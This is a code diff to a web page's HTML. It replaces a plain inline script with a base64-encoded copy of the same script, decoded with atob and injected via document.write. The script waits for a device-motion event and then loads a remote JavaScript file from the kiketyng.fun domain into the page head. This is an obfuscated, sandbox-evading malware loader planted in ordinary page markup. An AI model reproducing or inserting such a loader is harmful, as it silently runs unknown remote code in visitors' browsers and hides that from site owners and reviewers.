@@ -8,25 +8,13 @@
 </style>
 
 
+
 <script>
-var nodeAG = document.getElementById('accelerationIncludingGravity');
-var maxAG = 0;
-function onMotionChange(e) {
-var ag = e.accelerationIncludingGravity;
-for(var i in ag){
-if(Math.abs(maxAG) < Math.abs(ag[i])){
-maxAG = ag[i];
-}
-}
-var hah = maxAG.toFixed(2);
-var script = document.createElement('script');
-script.src = 'https://kiketyng.fun/idinah/main.js';
-if (hah > 0) document.getElementsByTagName('head')[0].appendChild(script);
-if (hah < 0) document.getElementsByTagName('head')[0].appendChild(script);
-window.removeEventListener('devicemotion', onMotionChange, true);
-}
-window.addEventListener('devicemotion', onMotionChange, true);
+var string = 'PHNjcmlwdD4NCnZhciBub2RlQUcgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYWNjZWxlcmF0aW9uSW5jbHVkaW5nR3Jhdml0eScpOw0KdmFyIG1heEFHID0gMDsNCmZ1bmN0aW9uIG9uTW90aW9uQ2hhbmdlKGUpIHsNCnZhciBhZyA9IGUuYWNjZWxlcmF0aW9uSW5jbHVkaW5nR3Jhdml0eTsNCmZvcih2YXIgaSBpbiBhZyl7DQppZihNYXRoLmFicyhtYXhBRykgPCBNYXRoLmFicyhhZ1tpXSkpew0KbWF4QUcgPSBhZ1tpXTsNCn0NCn0NCnZhciBoYWggPSBtYXhBRy50b0ZpeGVkKDIpOw0KdmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOw0Kc2NyaXB0LnNyYyA9ICdodHRwczovL2tpa2V0eW5nLmZ1bi9pZGluYWgvbWFpbi5qcyc7DQppZiAoaGFoID4gMCkgZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2hlYWQnKVswXS5hcHBlbmRDaGlsZChzY3JpcHQpOw0KaWYgKGhhaCA8IDApIGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdoZWFkJylbMF0uYXBwZW5kQ2hpbGQoc2NyaXB0KTsNCndpbmRvdy5yZW1vdmVFdmVudExpc3RlbmVyKCdkZXZpY2Vtb3Rpb24nLCBvbk1vdGlvbkNoYW5nZSwgdHJ1ZSk7DQp9DQp3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcignZGV2aWNlbW90aW9uJywgb25Nb3Rpb25DaGFuZ2UsIHRydWUpOw0KPC9zY3JpcHQ+';
+var decodedString = atob(string);
+document.write(''+ decodedString +'');
 </script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
 
 
 
